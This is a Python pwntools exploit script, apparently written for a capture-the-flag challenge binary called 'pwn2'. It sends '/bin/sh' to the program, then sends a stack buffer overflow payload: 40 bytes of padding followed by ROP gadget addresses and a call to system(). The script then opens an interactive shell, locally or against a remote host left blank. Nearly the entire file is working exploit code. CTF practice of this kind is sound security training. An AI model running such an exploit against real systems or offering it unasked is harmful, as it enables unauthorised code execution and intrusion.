#!/usr/bin/python3

from pwn import *

exe = ELF('pwn2', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
sla(b"flag?\n", b"/bin/sh\0")
payload = b"a" * 40 +p64(0x000000000040101a)+ p64(0x0000000000401196) + p64(0x404090) + p64(exe.sym['system'])
sla(b"flag?\n", payload)
p.interactive()
